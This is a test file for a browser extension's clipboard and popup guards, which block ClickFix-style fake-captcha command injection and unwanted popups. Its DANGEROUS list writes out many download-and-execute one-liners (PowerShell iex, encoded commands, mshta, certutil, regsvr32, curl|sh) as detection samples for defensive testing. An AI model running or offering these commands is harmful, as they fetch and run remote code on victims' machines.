// Block J: page guards (clipboard on, popups off), never on stream sites.
import "../src/settings/features.js";
import "../src/general/filter-options.js";
import "../src/threat/protected-hosts.js";
import "../src/threat/compile.js";
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import popupsSource from "../src/guards/popups.js" with { type: "text" };
import updateSource from "../src/general/update.js" with { type: "text" };
import manifest from "../manifest.json" with { type: "json" };
function assert(c, l) { if (!c) throw new Error(l); }
const F = globalThis.GeckoFeatures;
const loadClip = () => { const api = {}; new Function(`${clipboardSource}\nreturn installClipboardGuard;`)()(api); return api; };
const loadPop = () => { const api = {}; new Function(`${popupsSource}\nreturn installPopupGuard;`)()(api); return api; };

const DANGEROUS = [
  "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"",
  "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
  "pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
  "powershell -c \"(New-Object Net.WebClient).DownloadString('https://example.test/x')|iex\"",
  "iex(irm https://example.test/run)",
  "cmd /c start /min mshta https://example.test/verify.hta",
  "cmd.exe /c curl -s https://example.test/p.bat -o %TEMP%\\p.bat && %TEMP%\\p.bat",
  "mshta https://example.test/captcha.hta # I am not a robot - reCAPTCHA Verification ID: 4821",
  "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"calc\"\":close\")",
  "bitsadmin /transfer job /download /priority high https://example.test/a.exe %TEMP%\\a.exe",
  "certutil -urlcache -split -f https://example.test/a.exe a.exe",
  "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
  "regsvr32 /s /n /u /i:https://example.test/file.sct scrobj.dll",
  "msiexec /i https://example.test/setup.msi /qn",
  "curl -fsSL https://example.test/install.sh | sh",
  "wget -qO- https://example.test/x | sudo bash",
  "echo Y3VybCAtcyBodHRwczovL2V4YW1wbGUudGVzdA== | base64 -d | bash",
  "osascript -e 'do shell script \"curl -s https://example.test/x | sh\"'",
];
const BENIGN = [
  "npm install --save-dev typescript",
  "git clone https://github.com/example/repo.git",
  "curl -o file.zip https://example.test/file.zip",
  "pip install requests",
  "Get-ChildItem -Recurse | Select-Object Name",
  "PowerShell is a task automation shell from Microsoft.",
  "Order #4821 - your verification code is 552193",
  "https://example.test/watch?v=abc",
  "cmd /c dir",
  "sudo apt update && sudo apt install -y curl",
  "",
];

Deno.test("clipboard guard patterns: ClickFix-style commands match, ordinary snippets and text do not", () => {
  const g = loadClip();
  for (const s of DANGEROUS) assert(g.matchDangerous(s), "missed: " + s);
  for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
});

Deno.test("clipboard guard: docs hosts and deliberate copies are allowed", () => {
  const g = loadClip();
  for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh", "pkg.readthedocs.io"]) assert(g.onSafeHost(h), h);
  for (const h of ["github.com.evil.example", "notgithub.com", "captcha-verify.example"]) assert(!g.onSafeHost(h), h);
  const el = (attrs, text, parent) => ({ getAttribute: (k) => attrs[k] ?? null, className: attrs.class || "", id: attrs.id || "", textContent: text || "", parentElement: parent || null });
  const now = 10000;
  assert(g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true }, now), "Ctrl+C");
  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy to clipboard" }) }, now), "copy button");
  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({}, "", el({ class: "btn copy-code" })) }, now), "copy class on a parent");
  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ id: "recaptcha-anchor" }, "I'm not a robot") }, now), "fake captcha");
  assert(!g.deliberateCopy({ kind: "click", at: now - 5000, target: el({ "aria-label": "Copy" }) }, now), "stale click");
  assert(!g.deliberateCopy(null, now), "no input");
});

function fakePage(host, opts = {}) {
  const listeners = {};
  const written = [];
  const notices = [];
  let selection = "";
  class Clipboard { writeText(t) { written.push(t); return Promise.resolve(); } }
  const clipboard = new Clipboard();
  class Doc { execCommand(cmd) { if (cmd === "copy") written.push("exec:" + selection); return true; } }
  const document = new Doc();
  document.addEventListener = (t, f) => { (listeners[t] ||= []).push(f); };
  document.activeElement = null;
  class DataTransfer { constructor() { this.data = {}; } setData(t, v) { this.data[t] = v; } }
  const window = { getSelection: () => ({ toString: () => selection }), DataTransfer };
  const g = loadClip();
  let flag = opts.flag !== undefined ? opts.flag : true;
  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => 1000, notify: (id) => notices.push(id), flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
  return {
    g, written, notices, clipboard, document, window, setFlag: (v) => { flag = v; },
    select: (s) => { selection = s; },
    input: (type, e) => { for (const f of listeners[type] || []) f(Object.assign({ isTrusted: true }, e)); },
  };
}

Deno.test("clipboard guard blocks a page writing a dangerous command (writeText, execCommand copy, copy-event setData) and shows a notice", async () => {
  const p = fakePage("captcha-check.example");
  const bad = DANGEROUS[0];
  let rejected = false;
  await p.clipboard.writeText(bad).catch((e) => { rejected = e.name === "NotAllowedError"; });
  assert(rejected && p.written.length === 0 && p.notices.length === 1, "writeText blocked " + JSON.stringify({ rejected, w: p.written, n: p.notices }));
  await p.clipboard.writeText("hello there");
  assert(p.written[0] === "hello there", "benign text still copies");
  p.select(DANGEROUS[5]);
  assert(p.document.execCommand("copy") === false && p.written.length === 1, "execCommand copy of a selected command blocked");
  p.select("just some text");
  assert(p.document.execCommand("copy") === true, "normal selection copies");
  const dt = new p.window.DataTransfer();
  dt.setData("text/plain", DANGEROUS[1]);
  assert(dt.data["text/plain"] === undefined, "copy handler cannot swap in a command");
  dt.setData("text/plain", "fine");
  assert(dt.data["text/plain"] === "fine", "normal setData works");
});

Deno.test("clipboard guard allows a copy-button click, docs hosts, the switch off, and fails open on errors", async () => {
  const p = fakePage("blog.example");
  p.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "", parentElement: null } });
  await p.clipboard.writeText(DANGEROUS[14]);
  assert(p.written.length === 1, "deliberate copy button");
  const docs = fakePage("docs.github.com");
  await docs.clipboard.writeText("curl -fsSL https://example.test/install.sh | sh");
  assert(docs.written.length === 1, "docs host");
  const off = fakePage("captcha-check.example", { flag: false });
  await off.clipboard.writeText(DANGEROUS[0]);
  assert(off.written.length === 1, "switch off");
  const broken = fakePage("captcha-check.example", { flag: "throw" });
  await broken.clipboard.writeText(DANGEROUS[0]);
  assert(broken.written.length === 1, "fail open");
});

Deno.test("popup guard: no gesture, a second window per click and popunders are blocked; links, buttons, same site and sign-in pages open", () => {
  const g = loadPop();
  const loc = { href: "https://news.example/a", hostname: "news.example" };
  const ctx = (o) => Object.assign({ location: loc, activation: true, opensThisGesture: 0, lastClickTarget: {}, lastClickInteractive: true }, o);
  assert(g.judge("https://ads.example/x", ctx({ activation: false })) === "no user gesture", "no gesture");
  assert(g.judge("https://ads.example/x", ctx({ opensThisGesture: 1 })) === "second window in one click", "second window");
  assert(/popunder/.test(g.judge("https://ads.example/x", ctx({ lastClickInteractive: false }))), "popunder");
  assert(g.judge("https://ads.example/x", ctx({})) === null, "button click opens a window");
  assert(g.judge("/other-page", ctx({ activation: false })) === null, "same site");
  assert(g.judge("https://cdn.news.example/x", ctx({ activation: false })) === null, "same site subdomain");
  assert(g.judge("https://accounts.google.com/o/oauth2", ctx({ activation: false })) === null, "sign-in");
  assert(g.judge("about:blank", ctx({ activation: false })) === null, "about:blank");
  assert(g.judge("javascript:alert(1)", ctx({ activation: false })) === "no user gesture", "non-http without a gesture");
});

Deno.test("popup guard wrapper: default off until the switch says on; blocks then; fails open", () => {
  const g = loadPop();
  const opened = [];
  const listeners = {};
  let flag = false;
  const win = { open: (u) => { opened.push(u); return {}; } };
  const nav = { userActivation: { isActive: false } };
  g.install({ window: win, document: { addEventListener: (t, f) => { listeners[t] = f; } }, navigator: nav, location: { href: "https://news.example/", hostname: "news.example" }, now: () => 5000, flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
  win.open("https://ads.example/");
  assert(opened.length === 1, "off by default: opens");
  flag = true;
  assert(win.open("https://ads.example/") === null && opened.length === 1, "on: blocked without gesture");
  nav.userActivation.isActive = true;
  listeners.click({ isTrusted: true, target: { closest: () => ({ tagName: "BUTTON" }) } });
  win.open("https://share.example/");
  assert(opened.length === 2, "button click opens one");
  assert(win.open("https://ads.example/2") === null, "second in the same click blocked");
  flag = "throw";
  win.open("https://ads.example/3");
  assert(opened.length === 3, "fail open");
});

Deno.test("manifest: guards and their flag script run on ordinary sites only (exclude list generated from the registry)", () => {
  const guards = manifest.content_scripts.find((c) => c.js.includes("src/guards/clipboard.js"));
  assert(guards && guards.world === "MAIN" && guards.all_frames === true && guards.run_at === "document_start" && guards.js.includes("src/guards/popups.js"), "guard entry");
  const flags = manifest.content_scripts.find((c) => c.js.includes("src/settings/flags.js") && c.matches.includes("https://*/*"));
  assert(flags && flags.world !== "MAIN" && flags.all_frames === true && flags.js[0] === "src/settings/features.js", "flags entry for ordinary sites");
  for (const e of [guards, flags]) {
    assert(JSON.stringify([...e.exclude_matches].sort()) === JSON.stringify(F.streamExcludeMatches().sort()), "exclude_matches from the registry");
    assert(JSON.stringify(e.matches) === JSON.stringify(["http://*/*", "https://*/*"]), "ordinary sites");
  }
  assert(F.byId("guardClipboard").default === true && F.byId("guardPopups").default === false, "defaults (D-4)");
  assert(F.resolve(null, null, "news.example").guardClipboard && !F.resolve(null, null, "news.example").guardPopups, "resolved defaults");
  assert(/PAGE_FLAGS = \[[^\]]*"guardClipboard"[^\]]*"guardPopups"/.test(Deno.readTextFileSync(new URL("../src/settings/flags.js", import.meta.url))), "flags handed to the guards");
});

Deno.test("threat lists' $popup-only hosts become main_frame-only threat rules (protected hosts still rejected)", () => {
  const U = {};
  new Function(`${updateSource}\nreturn installGeneralAdblockUpdate;`)()(U);
  const parsed = U.parseEntries(["||popfraud.example^$popup", "||popboth.example^$popup,third-party", "||docpop.example^$doc,popup", "||kick.com^$popup", "||plain.example^"].join("\n"));
  assert(JSON.stringify(parsed.popup) === JSON.stringify(["popfraud.example", "kick.com"]), JSON.stringify(parsed));
  const TC = globalThis.GeckoThreatCompile;
  const c = TC.compileThreatRules(TC.threatHostsFromEntries(parsed), { idBase: 1, popupHosts: parsed.popup });
  const popupRule = c.rules.find((r) => r.condition.resourceTypes.length === 1);
  assert(popupRule && popupRule.condition.resourceTypes[0] === "main_frame" && JSON.stringify(popupRule.condition.requestDomains) === JSON.stringify(["popfraud.example"]), JSON.stringify(c.rules));
  assert(c.rejected.some((r) => r.host === "kick.com"), "protected host rejected");
  assert(c.rules.every((r) => r.priority === 2000010), "threat priority");
  // Plain lists never see them (the ordinary tier drops $popup-only filters).
  assert(!parsed.domains.includes("popfraud.example") && !parsed.scoped.some(([d]) => d === "popfraud.example"), "not an ordinary block");
});
